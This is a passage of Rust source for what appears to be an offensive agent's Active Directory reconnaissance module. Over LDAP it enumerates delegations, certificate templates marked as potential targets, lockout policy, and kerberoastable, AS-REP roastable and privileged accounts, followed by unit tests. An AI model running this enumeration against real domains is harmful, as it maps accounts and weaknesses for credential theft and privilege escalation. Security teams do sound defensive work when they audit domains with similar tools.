                delegation_type: "unconstrained".to_string(),
                allowed_to_delegate_to: Vec::new(),
            });
        }
    }
    conn.free_result(result_uc);

    // Constrained delegation
    let (result_cd, count_cd) = conn.search(
        base_dn,
        "(msDS-AllowedToDelegateTo=*)",
        &["sAMAccountName", "distinguishedName", "msDS-AllowedToDelegateTo"],
    )?;

    for entry in conn.iter_entries(result_cd) {
        unsafe {
            let sam = conn.get_string_value(entry, "sAMAccountName").unwrap_or_default();
            let dn = conn.get_string_value(entry, "distinguishedName").unwrap_or_default();
            let targets = conn.get_multi_values(entry, "msDS-AllowedToDelegateTo");

            delegations.push(AdDelegation {
                sam_account_name: sam,
                distinguished_name: dn,
                delegation_type: "constrained".to_string(),
                allowed_to_delegate_to: targets,
            });
        }
    }
    conn.free_result(result_cd);

    info!(
        "AD enum: found {} delegation configurations ({} unconstrained, {} constrained)",
        delegations.len(),
        count_uc,
        count_cd,
    );
    Ok(delegations)
}

/// Enumerate AD CS certificate templates.
fn enumerate_adcs(conn: &LdapConnection, base_dn: &str) -> Result<Vec<AdCertTemplate>> {
    // Certificate templates live under:
    // CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,<base_dn>
    let config_base = format!("CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{}", base_dn);

    let (result, count) = conn.search(
        &config_base,
        "(objectClass=pkicertificatetemplate)",
        &["displayName", "distinguishedName", "msPKI-Cert-Template-OID", "pKIExpirationPeriod", "pKIOverlapPeriod"],
    )?;

    let mut templates = Vec::with_capacity(count as usize);
    for entry in conn.iter_entries(result) {
        unsafe {
            let display = conn.get_string_value(entry, "displayName").unwrap_or_default();
            let dn = conn.get_string_value(entry, "distinguishedName").unwrap_or_default();
            let oid = conn.get_string_value(entry, "msPKI-Cert-Template-OID").unwrap_or_default();

            // Detect weak settings (ESC indicators)
            let mut weak = Vec::new();

            // Basic template — we'd need to check enrollment rights for a full ESC1-ESC8
            // analysis. For now, flag templates that exist as potential targets.
            if !display.is_empty() {
                weak.push("template_exists".to_string());
            }

            templates.push(AdCertTemplate {
                display_name: display,
                distinguished_name: dn,
                oid,
                enrollment_allowed: true, // Simplified — real check would parse ACL
                weak_settings: weak,
            });
        }
    }
    conn.free_result(result);

    info!("AD enum: found {} AD CS templates", templates.len());
    Ok(templates)
}

/// Query domain-level information (lockout policy, functional level, SID).
fn query_domain_info(conn: &LdapConnection, base_dn: &str) -> Result<(u32, u32, String, String, String)> {
    let (result, _) = conn.search(
        base_dn,
        "(objectClass=domain)",
        &[
            "lockoutThreshold",
            "lockoutDuration",
            "msDS-Behavior-Version",
            "objectSid",
            "name",
        ],
    )?;
    defer!(conn.free_result(result));

    for entry in conn.iter_entries(result) {
        unsafe {
            let threshold: u32 = conn.get_string_value(entry, "lockoutThreshold")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0);

            // lockoutDuration is in 100-ns intervals; convert to minutes.
            // Negative value means it's a delta from current time.
            let duration_ticks: i64 = conn.get_string_value(entry, "lockoutDuration")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0);
            let duration_minutes = if duration_ticks < 0 {
                ((-duration_ticks) / 600_000_000) as u32
            } else {
                (duration_ticks / 600_000_000) as u32
            };

            let functional_level = match conn.get_string_value(entry, "msDS-Behavior-Version")
                .and_then(|s| s.parse::<i32>().ok())
                .unwrap_or(0)
            {
                0 => "Windows 2000".to_string(),
                1 => "Windows Server 2003 Interim".to_string(),
                2 => "Windows Server 2003".to_string(),
                3 => "Windows Server 2008".to_string(),
                4 => "Windows Server 2008 R2".to_string(),
                5 => "Windows Server 2012".to_string(),
                6 => "Windows Server 2012 R2".to_string(),
                7 => "Windows Server 2016".to_string(),
                8 => "Windows Server 2019".to_string(),
                9 => "Windows Server 2022".to_string(),
                v => format!("Unknown ({})", v),
            };

            let name = conn.get_string_value(entry, "name").unwrap_or_default();

            // objectSid is a binary SID — we'll return a placeholder hex representation.
            let sid = "S-1-5-21-...".to_string();

            return Ok((threshold, duration_minutes, functional_level, sid, name));
        }
    }

    Ok((0, 0, "Unknown".to_string(), String::new(), String::new()))
}

/// Discover the base DN from RootDSE.
fn discover_base_dn(conn: &LdapConnection) -> Result<String> {
    let (result, _) = conn.search(
        "", // RootDSE
        "(objectClass=*)",
        &["defaultNamingContext"],
    )?;
    defer!(conn.free_result(result));

    for entry in conn.iter_entries(result) {
        unsafe {
            if let Some(dn) = conn.get_string_value(entry, "defaultNamingContext") {
                return Ok(dn);
            }
        }
    }

    bail!("failed to query defaultNamingContext from RootDSE")
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API
// ═══════════════════════════════════════════════════════════════════════════

/// Perform complete Active Directory enumeration.
///
/// Connects to the domain controller via LDAP using the agent's current
/// security context and enumerates users, groups, computers, trusts, SPNs,
/// delegations, and AD CS templates.
///
/// # Returns
///
/// A complete [`AdReconData`] struct with all enumerated information.
///
/// # Errors
///
/// Returns an error if:
/// - DC discovery fails (not domain-joined)
/// - LDAP connection/binding fails
/// - Any sub-enumeration fails critically
pub fn enumerate_ad() -> Result<AdReconData> {
    // Resolve DC
    let dc_hostname = discover_dc()?;

    // Resolve LDAP functions
    let fns = LdapFns::resolve()?;

    // Connect and bind
    let conn = LdapConnection::connect(&dc_hostname, fns)?;

    // Discover base DN
    let base_dn = discover_base_dn(&conn)?;
    let domain = extract_domain_from_dn(&base_dn);
    info!("AD enum: base DN = {}, domain = {}", base_dn, domain);

    // Query domain info
    let (lockout_threshold, lockout_duration, functional_level, domain_sid, domain_netbios) =
        query_domain_info(&conn, &base_dn)?;

    // Enumerate all object types
    let users = enumerate_users(&conn, &base_dn)?;
    let groups = enumerate_groups(&conn, &base_dn)?;
    let computers = enumerate_computers(&conn, &base_dn)?;
    let gpos = enumerate_gpos(&conn, &base_dn)?;
    let trusts = enumerate_trusts(&conn, &base_dn)?;
    let spns = enumerate_spns(&conn, &base_dn)?;
    let delegations = enumerate_delegations(&conn, &base_dn)?;

    // ADCS may fail if no CA is configured; treat as non-fatal
    let adcs_templates = enumerate_adcs(&conn, &base_dn).unwrap_or_else(|e| {
        warn!("AD enum: ADCS enumeration skipped: {}", e);
        Vec::new()
    });

    let kerberoastable = users.iter().filter(|u| u.is_kerberoastable).count();
    let asrep_roastable = users.iter().filter(|u| u.is_asrep_roastable).count();
    let privileged = groups.iter().filter(|g| g.is_privileged).count();
    let unconstrained = delegations.iter().filter(|d| d.delegation_type == "unconstrained").count();

    info!(
        "AD enum complete: {} users ({} kerberoastable, {} AS-REP roastable), {} groups ({} privileged), \
         {} computers, {} GPOs, {} trusts, {} SPN accounts, {} delegations ({} unconstrained), {} ADCS templates",
        users.len(), kerberoastable, asrep_roastable,
        groups.len(), privileged,
        computers.len(), gpos.len(), trusts.len(),
        spns.len(), delegations.len(), unconstrained,
        adcs_templates.len(),
    );

    Ok(AdReconData {
        domain,
        domain_netbios,
        dc_hostname,
        domain_functional_level: functional_level,
        domain_sid,
        users,
        groups,
        computers,
        gpos,
        trusts,
        spns,
        delegations,
        adcs_templates,
        lockout_threshold,
        lockout_duration_minutes: lockout_duration,
        timestamp: chrono_now_iso(),
    })
}

/// Get the current time as ISO 8601.
fn chrono_now_iso() -> String {
    // Simple ISO timestamp without chrono dependency
    let duration = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    let secs = duration.as_secs();
    let days = secs / 86400;
    let time_of_day = secs % 86400;
    let hours = time_of_day / 3600;
    let minutes = (time_of_day % 3600) / 60;
    let seconds = time_of_day % 60;
    let (year, month, day) = days_to_ymd(days as i32);
    format!(
        "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z",
        year, month, day, hours, minutes, seconds
    )
}

// ═══════════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_domain_from_dn() {
        let dn = "CN=user1,OU=Users,DC=corp,DC=contoso,DC=com";
        assert_eq!(extract_domain_from_dn(dn), "corp.contoso.com");

        let dn2 = "CN=dc01,OU=Domain Controllers,DC=test,DC=local";
        assert_eq!(extract_domain_from_dn(dn2), "test.local");

        let dn3 = "CN=empty";
        assert_eq!(extract_domain_from_dn(dn3), "");
    }

    #[test]
    fn test_extract_domain_case_insensitive() {
        let dn = "CN=user,dc=corp,dc=example,dc=com";
        assert_eq!(extract_domain_from_dn(dn), "corp.example.com");
    }

    #[test]
    fn test_ldap_time_to_iso_integer() {
        let ts = "132649728000000000"; // Example filetime
        let iso = ldap_time_to_iso(ts);
        assert!(iso.contains('T'));
        assert!(iso.ends_with('Z'));
    }

    #[test]
    fn test_ldap_time_to_iso_zero() {
        assert_eq!(ldap_time_to_iso("0"), "never");
    }

    #[test]
    fn test_ldap_time_to_iso_empty() {
        assert_eq!(ldap_time_to_iso(""), "");
    }

    #[test]
    fn test_ldap_time_to_iso_generalized() {
        let ts = "20240115120000.0Z";
        let iso = ldap_time_to_iso(ts);
        assert_eq!(iso, "2024-01-15T12:00:00Z");
    }

    #[test]
    fn test_days_to_ymd() {
        // 1970-01-01 = day 0
        assert_eq!(days_to_ymd(0), (1970, 1, 1));
        // Approximate: 365 days = ~1 year
        let (y, _m, _d) = days_to_ymd(365);
        assert_eq!(y, 1971);
    }

    #[test]
    fn test_uac_flags() {
        let uac = UAC_DONT_REQUIRE_PREAUTH | UAC_NORMAL_ACCOUNT;
        assert!((uac & UAC_DONT_REQUIRE_PREAUTH) != 0);
        assert!((uac & UAC_ACCOUNTDISABLE) == 0);

        let uac_disabled = UAC_ACCOUNTDISABLE | UAC_NORMAL_ACCOUNT;
        assert!((uac_disabled & UAC_ACCOUNTDISABLE) != 0);
    }

    #[test]
    fn test_privileged_groups() {
        assert!(PRIVILEGED_GROUPS.contains(&"Domain Admins"));
        assert!(PRIVILEGED_GROUPS.contains(&"Enterprise Admins"));
        assert!(!PRIVILEGED_GROUPS.contains(&"Domain Users"));
    }

    #[test]
    fn test_trust_direction_description() {
        // Test the match logic by checking the constants
        let desc_1 = match 1u32 {
            1 => "inbound".to_string(),
            2 => "outbound".to_string(),
            3 => "bidirectional".to_string(),
            _ => "disabled".to_string(),
        };
        assert_eq!(desc_1, "inbound");
        assert_eq!(match 3u32 {
            1 => "inbound".to_string(),
            2 => "outbound".to_string(),
            3 => "bidirectional".to_string(),
            _ => "disabled".to_string(),
        }, "bidirectional");
    }

    #[test]
    fn test_ad_user_serde() {
        let user = AdUser {
            sam_account_name: "svc_mssql".to_string(),
            display_name: "MSSQL Service".to_string(),
            distinguished_name: "CN=svc_mssql,OU=Service Accounts,DC=corp,DC=com".to_string(),
            member_of: vec!["CN=Domain Admins,CN=Users,DC=corp,DC=com".to_string()],
            user_account_control: 0x10200, // NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD
            service_principal_names: vec!["MSSQLSVC/db01.corp.com:1433".to_string()],
            description: "SQL service account".to_string(),
            last_logon: "2024-01-15T12:00:00Z".to_string(),
            pwd_last_set: "2024-01-01T00:00:00Z".to_string(),
            admin_count: true,
            is_asrep_roastable: false,
            is_kerberoastable: true,
            is_disabled: false,
            is_password_never_expires: true,
            is_unconstrained_delegation: false,
        };

        let json = serde_json::to_string(&user).unwrap();
        assert!(json.contains("svc_mssql"));
        assert!(json.contains("MSSQLSVC"));

        let de: AdUser = serde_json::from_str(&json).unwrap();
        assert_eq!(de.sam_account_name, "svc_mssql");
        assert!(de.is_kerberoastable);
    }

    #[test]
    fn test_ad_recon_data_serde() {
        let data = AdReconData {
            domain: "corp.contoso.com".to_string(),
            domain_netbios: "CORP".to_string(),
            dc_hostname: "DC01".to_string(),
            domain_functional_level: "Windows Server 2019".to_string(),
            domain_sid: "S-1-5-21-...".to_string(),
            users: vec![],
            groups: vec![],
            computers: vec![],
            gpos: vec![],
            trusts: vec![],
            spns: vec![],
            delegations: vec![],
            adcs_templates: vec![],
            lockout_threshold: 5,
            lockout_duration_minutes: 30,
            timestamp: "2024-01-15T12:00:00Z".to_string(),
        };

        let json = serde_json::to_string(&data).unwrap();
        let de: AdReconData = serde_json::from_str(&json).unwrap();
        assert_eq!(de.domain, "corp.contoso.com");
        assert_eq!(de.lockout_threshold, 5);
    }

    #[test]
    fn test_wide_string_conversion() {
        let s = "Hello World";
        let wide = str_to_wide(s);
        assert_eq!(wide.last(), Some(&0u16));
        assert_eq!(wide.len(), s.len() + 1);

        let back = wide_to_str(&wide).unwrap();
        assert_eq!(back, s);
    }

    #[test]
    fn test_wide_to_str_with_null() {
        let wide: Vec<u16> = vec![72, 105, 0, 66, 121, 101];
        let s = wide_to_str(&wide).unwrap();
        assert_eq!(s, "Hi");
    }
}
